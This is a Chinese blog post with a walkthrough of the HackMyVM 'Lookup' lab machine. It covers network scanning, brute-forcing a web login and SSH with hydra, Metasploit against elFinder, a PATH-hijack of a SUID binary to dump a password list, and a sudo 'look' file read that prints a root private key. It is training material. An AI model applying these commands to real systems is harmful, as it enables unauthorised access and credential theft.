@@ -1,0 +1,326 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>HackMyVM-Lookup | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="难度:medium kali:192.168.31.34 靶机:192.168.31.193 root@kali2 [~] ➜  arp-scan -l                                        [21:55:49] Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.31.3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackMyVM-Lookup">
+<meta property="og:url" content="https://tao0845.github.io/posts/65c2fc62/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="难度:medium kali:192.168.31.34 靶机:192.168.31.193 root@kali2 [~] ➜  arp-scan -l                                        [21:55:49] Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: 192.168.31.3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/10/07/ODoiQS.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/10/07/ODonCN.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/10/07/ODo7iC.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/10/07/ODoN4L.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/10/07/ODoe6i.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/10/07/ODoAbX.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/10/07/ODoKmt.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/10/07/ODoZYx.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/10/07/ODoyqj.png">
+<meta property="og:image" content="https://ooo.0x0.ooo/2024/10/07/ODomSU.png">
+<meta property="article:published_time" content="2024-10-07T13:48:36.385Z">
+<meta property="article:modified_time" content="2024-10-08T02:26:36.724Z">
+<meta property="article:author" content="ta0">
+<meta property="article:tag" content="环境变量劫持">
+<meta property="article:tag" content="elfinder">
+<meta property="article:tag" content="look任意文件读取">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ooo.0x0.ooo/2024/10/07/ODoiQS.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">87</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">11</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">139</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text">web探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getShell"><span class="toc-number">3.</span> <span class="toc-text">getShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">SUID提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83root"><span class="toc-number">5.</span> <span class="toc-text">sudo提权root</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/65c2fc62/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">HackMyVM-Lookup</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-10-07 21:48:36" itemprop="dateCreated datePublished" datetime="2024-10-07T21:48:36+08:00">2024-10-07</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-10-08 10:26:36" itemprop="dateModified" datetime="2024-10-08T10:26:36+08:00">2024-10-08</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">1.6k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">9m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/HackMyVM/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">HackMyVM</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">环境变量劫持</span></a><a class="tag-item" href="/tags/elfinder/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">elfinder</span></a><a class="tag-item" href="/tags/look%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">look任意文件读取</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p><strong>难度:medium</strong></p>
+<p><strong>kali:192.168.31.34</strong></p>
+<p><strong>靶机:192.168.31.193</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  arp-scan <span class="token parameter variable">-l</span>                                        <span class="token punctuation">[</span><span class="token number">21</span>:55:49<span class="token punctuation">]</span>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.31.34
+Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
+<span class="token number">192.168</span>.31.1	c8:bf:4c:1e:d6:ed	Beijing Xiaomi Mobile Software Co., Ltd
+<span class="token number">192.168</span>.31.10	<span class="token number">14</span>:13:33:54:99:11	AzureWave Technology Inc.
+<span class="token number">192.168</span>.31.82	<span class="token number">34</span>:6f:24:92:d4:07	AzureWave Technology Inc.
+<span class="token number">192.168</span>.31.88	e0:0a:f6:9c:18:71	Liteon Technology Corporation
+<span class="token number">192.168</span>.31.77	f4:bb:c7:de:86:66	vivo Mobile Communication Co., Ltd.
+<span class="token number">192.168</span>.31.193	08:00:27:2b:c6:dc	PCS Systemtechnik GmbH
+<span class="token number">192.168</span>.31.206	<span class="token number">44</span>:e5:17:0a:27:01	Intel Corporate
+<span class="token number">192.168</span>.31.239	e2:2f:20:62:e9:22	<span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span></code></pre>
+
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  nmap <span class="token number">192.168</span>.31.193                                <span class="token punctuation">[</span><span class="token number">21</span>:59:13<span class="token punctuation">]</span>
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-10-07 <span class="token number">22</span>:04 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.31.193
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000098s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT   STATE SERVICE
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http
+MAC Address: 08:00:27:2B:C6:DC <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.14</span> seconds</code></pre>
+<p>看下web服务</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://ooo.0x0.ooo/2024/10/07/ODoiQS.png" alt="ODoiQS.png" loading="lazy"><br>输入ip自动跳转到<code>lookup.hmv</code>域名，添加到hosts<br><img src="https://ooo.0x0.ooo/2024/10/07/ODonCN.png" alt="ODonCN.png" loading="lazy"><br>是个登录界面，bp启动<br><img src="https://ooo.0x0.ooo/2024/10/07/ODo7iC.png" alt="ODo7iC.png" loading="lazy"><br>这个password123与其他包不一样，其他是wrong password,它是wrong username or password，说明有个用户密码是<code>password123</code>,但用户名不是admin,再爆破一下用户名<br><img src="https://ooo.0x0.ooo/2024/10/07/ODoN4L.png" alt="ODoN4L.png" loading="lazy"><br>拿到一个用户名<code>jose</code><br><img src="https://ooo.0x0.ooo/2024/10/07/ODoe6i.png" alt="ODoe6i.png" loading="lazy"><br>登录之后跳转到<code>http://files.lookup.hmv/</code>，再把这个子域添加到hosts</p>
+<h2 id="getShell"><a href="#getShell" class="headerlink" title="getShell"></a>getShell</h2><p><img src="https://ooo.0x0.ooo/2024/10/07/ODoAbX.png" alt="ODoAbX.png" loading="lazy"><br>搜一下elFinder，发现是个web文件管理器，搜到了相关漏洞<br><img src="https://ooo.0x0.ooo/2024/10/07/ODoKmt.png" alt="ODoKmt.png" loading="lazy"><br>那么msf启动吧<br><img src="https://ooo.0x0.ooo/2024/10/07/ODoZYx.png" alt="ODoZYx.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/10/07/ODoyqj.png" alt="ODoyqj.png" loading="lazy"><br>成功拿到shell</p>
+<h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><p>搜一下suid</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@lookup:/home/think$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+/snap/snapd/19457/usr/lib/snapd/snap-confine
+/snap/core20/1950/usr/bin/chfn
+/snap/core20/1950/usr/bin/chsh
+/snap/core20/1950/usr/bin/gpasswd
+/snap/core20/1950/usr/bin/mount
+/snap/core20/1950/usr/bin/newgrp
+/snap/core20/1950/usr/bin/passwd
+/snap/core20/1950/usr/bin/su
+/snap/core20/1950/usr/bin/sudo
+/snap/core20/1950/usr/bin/umount
+/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1950/usr/lib/openssh/ssh-keysign
+/snap/core20/1974/usr/bin/chfn
+/snap/core20/1974/usr/bin/chsh
+/snap/core20/1974/usr/bin/gpasswd
+/snap/core20/1974/usr/bin/mount
+/snap/core20/1974/usr/bin/newgrp
+/snap/core20/1974/usr/bin/passwd
+/snap/core20/1974/usr/bin/su
+/snap/core20/1974/usr/bin/sudo
+/snap/core20/1974/usr/bin/umount
+/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1974/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/sbin/pwm
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/umount</code></pre>
+<p>&#x2F;usr&#x2F;sbin&#x2F;pwm比较显眼<br><img src="https://ooo.0x0.ooo/2024/10/07/ODomSU.png" alt="ODomSU.png" loading="lazy"><br>看样子是执行了id指令，然后提取usernmae和uid，然后读取这个用户的密码文件，现在需要将id输入的结果换成think用户的uid，可以环境变量劫持</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@lookup:/tmp$ <span class="token builtin class-name">cd</span> ~  
+www-data@lookup:/var/www$ <span class="token builtin class-name">cd</span>  /tmp
+www-data@lookup:/tmp$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp:<span class="token environment constant">$PATH</span>
+www-data@lookup:/tmp$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+www-data@lookup:/tmp$</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">idookup:/tmp$ <span class="token builtin class-name">echo</span> <span class="token string">"echo 'uid=1000(think) gid=1000(think) groups=1000(think)'"</span> <span class="token operator">></span> <span class="token function">id</span>
+www-data@lookup:/tmp$ <span class="token function">cat</span> <span class="token function">id</span>
+<span class="token builtin class-name">echo</span> <span class="token string">'uid=1000(think) gid=1000(think) groups=1000(think)'</span>
+www-data@lookup:/tmp$ <span class="token function">chmod</span> +x <span class="token function">id</span>
+www-data@lookup:/tmp$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+www-data@lookup:/tmp$ pwm
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Running <span class="token string">'id'</span> <span class="token builtin class-name">command</span> to extract the username and user ID <span class="token punctuation">(</span><span class="token environment constant">UID</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> ID: think
+jose1006
+jose1004
+jose1002
+jose1001teles
+jose100190
+jose10001
+jose10.asd
+jose10+
+jose0_07
+jose0990
+jose0986$
+jose098130443
+jose0981
+jose0924
+jose0923
+jose0921
+thepassword
+jose<span class="token punctuation">(</span><span class="token number">1993</span><span class="token punctuation">)</span>
+jose'sbabygurl
+jose<span class="token operator">&amp;</span>vane
+jose<span class="token operator">&amp;</span>takie
+jose<span class="token operator">&amp;</span>samantha
+jose<span class="token operator">&amp;</span>pam
+jose<span class="token operator">&amp;</span>jlo
+jose<span class="token operator">&amp;</span>jessica
+jose<span class="token operator">&amp;</span>jessi
+josemario.AKA<span class="token punctuation">(</span>think<span class="token punctuation">)</span>
+jose.medina.
+jose.mar
+jose.luis.24.oct
+jose.line
+jose.leonardo100
+jose.leas.30
+jose.ivan
+jose.i22
+jose.hm
+jose.hater
+jose.fa
+jose.f
+jose.dont
+jose.d
+jose.com<span class="token punctuation">&#125;</span>
+jose.com
+jose.chepe_06
+jose.a91
+jose.a
+jose.96.
+jose.9298
+jose.2856171</code></pre>
+<p>爆破一下ssh</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  hydra <span class="token parameter variable">-l</span> think <span class="token parameter variable">-P</span> aaa ssh://192.168.31.193                                                                                                                                         <span class="token punctuation">[</span><span class="token number">10</span>:11:12<span class="token punctuation">]</span>
+Hydra v9.5 <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2023</span> by van Hauser/THC <span class="token operator">&amp;</span> David Maciejak - Please <span class="token keyword">do</span> not use <span class="token keyword">in</span> military or secret <span class="token function">service</span> organizations, or <span class="token keyword">for</span> illegal purposes <span class="token punctuation">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="token punctuation">)</span>.
+
+Hydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> starting at <span class="token number">2024</span>-10-08 <span class="token number">10</span>:11:31
+<span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use <span class="token parameter variable">-t</span> <span class="token number">4</span>
+<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> max <span class="token number">16</span> tasks per <span class="token number">1</span> server, overall <span class="token number">16</span> tasks, <span class="token number">49</span> login tries <span class="token punctuation">(</span>l:1/p:49<span class="token punctuation">)</span>, ~4 tries per task
+<span class="token punctuation">[</span>DATA<span class="token punctuation">]</span> attacking ssh://192.168.31.193:22/
+<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">[</span>ssh<span class="token punctuation">]</span> host: <span class="token number">192.168</span>.31.193   login: think   password: josemario.AKA<span class="token punctuation">(</span>think<span class="token punctuation">)</span>
+<span class="token number">1</span> of <span class="token number">1</span> target successfully completed, <span class="token number">1</span> valid password found
+<span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> Writing restore <span class="token function">file</span> because <span class="token number">1</span> final worker threads did not complete <span class="token keyword">until</span> end.
+<span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> <span class="token number">1</span> target did not resolve or could not be connected
+<span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> <span class="token number">0</span> target did not complete
+Hydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> finished at <span class="token number">2024</span>-10-08 <span class="token number">10</span>:11:36</code></pre>
+<p>拿到think用户密码<code>josemario.AKA(think)</code></p>
+<h2 id="sudo提权root"><a href="#sudo提权root" class="headerlink" title="sudo提权root"></a>sudo提权root</h2><pre class="language-bash" data-language="bash"><code class="language-bash">think@lookup:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> think on lookup:
+    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin
+
+User think may run the following commands on lookup:
+    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> /usr/bin/look</code></pre>
+<p>可以sudo提权</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">think@lookup:~$ <span class="token function">sudo</span> <span class="token function">look</span> <span class="token string">''</span> /root/root.txt
+5a285***********f57d18e8</code></pre>
+<p>可以直接拿到root flag，不过为了提升到root权限，简单读一下root的私钥</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">think@lookup:~$ <span class="token function">sudo</span> <span class="token function">look</span> <span class="token string">''</span> /root/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
